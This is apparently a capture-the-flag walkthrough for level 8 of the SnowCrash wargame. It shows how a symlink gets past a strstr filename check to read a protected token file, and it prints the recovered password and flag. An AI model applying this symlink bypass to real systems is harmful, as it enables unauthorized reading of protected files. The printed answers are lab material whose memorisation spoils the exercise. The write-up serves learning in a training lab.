# LEVEL 8

- When analysing the binary we see that it call strstr to check wether arg1 is including "token"
- So we can create a symlink for token to bypass the strstr check

```
ln -s ~/token /tmp/symlink
./level08 /tmp/symlink
```

```
quif5eloekouj29ke0vouxean
```

```
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```